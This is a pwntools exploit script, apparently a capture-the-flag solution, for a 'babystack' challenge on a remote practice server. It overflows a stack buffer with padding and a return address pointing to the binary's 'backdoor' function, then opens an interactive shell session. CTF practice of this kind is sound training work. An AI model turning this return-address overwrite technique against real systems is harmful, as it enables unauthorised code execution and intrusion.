from pwn import *
context.arch='amd64'

# p = process('./babystack')
p = remote('node3.buuoj.cn',29940)

p.recvuntil("[+]Please input the length of your name:")
p.sendline('32')
# make sure the length is enough to call backdoor by stack overflow

payload = 'A'*(0x10+8) + p64(ELF('./babystack',checksec=False).sym['backdoor'])
p.recvuntil('name?')
p.send(payload)
sleep(1)
p.interactive()
